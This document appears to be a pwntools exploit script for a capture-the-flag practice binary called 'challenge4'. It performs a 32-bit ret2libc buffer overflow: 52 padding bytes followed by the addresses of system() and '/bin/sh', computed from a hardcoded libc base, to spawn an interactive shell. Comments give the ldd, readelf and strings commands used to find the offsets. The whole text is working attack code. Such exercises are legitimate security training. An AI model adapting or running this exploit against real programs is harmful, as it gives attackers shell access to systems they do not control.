from pwn import *

elf = context.binary = ELF('./challenge4')

p = process()

print(p.recv())

# $ ldd challenge
libc = 0xf7d84000

# $ readelf -s /lib32/libc.so.6 | grep system
system = libc + 0x47cd0

# $ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
shell = libc + 0x1b90f5

payload = b'A'*52
payload += p32(system)
payload += p32(0x0)
payload += p32(shell)

p.sendline(payload)
p.interactive()